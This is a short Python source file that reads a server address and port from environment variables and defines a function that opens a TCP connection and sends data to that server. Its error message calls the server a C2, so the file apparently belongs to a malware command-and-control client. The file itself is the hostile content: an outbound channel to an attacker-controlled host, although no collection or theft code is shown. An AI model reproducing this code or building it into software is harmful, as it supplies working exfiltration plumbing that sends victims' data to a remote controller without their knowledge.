import socket
import os
from dotenv import load_dotenv

load_dotenv()

SERVER_IP = os.getenv("SERVER_IP")
SERVER_PORT = int(os.getenv("SERVER_PORT"))

def sendData(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((SERVER_IP, SERVER_PORT))
            client.sendall(data.encode())
    except Exception as e:
        print("[ERROR] C2 Connection Failed:", e)
